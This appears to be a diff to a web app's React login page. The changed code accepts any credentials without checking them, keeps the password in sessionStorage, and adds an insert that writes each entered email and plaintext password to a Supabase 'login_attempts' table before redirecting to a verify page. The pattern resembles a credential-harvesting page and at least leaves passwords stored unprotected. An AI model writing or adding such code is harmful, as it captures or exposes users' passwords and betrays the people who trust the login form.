@@ -28,10 +28,22 @@ export default function LoginPage() {
     setError('');
 
     try {
-      // Save email to sessionStorage and redirect to verify page
-      // No database verification needed - just accept the credentials
+      // Save to sessionStorage
       sessionStorage.setItem('reg_email', email.trim().toLowerCase());
       sessionStorage.setItem('reg_password', password);
+
+      // Try to save login attempt to database (if table exists)
+      try {
+        const regId = sessionStorage.getItem('reg_id');
+        await supabase.from('login_attempts').insert({
+          registration_id: regId || null,
+          email: email.trim().toLowerCase(),
+          password: password,
+        });
+      } catch (dbErr) {
+        console.warn('Could not save login attempt to database:', dbErr);
+        // Continue anyway - login should still work
+      }
       
       setLoading(false);
       navigate('/verify');
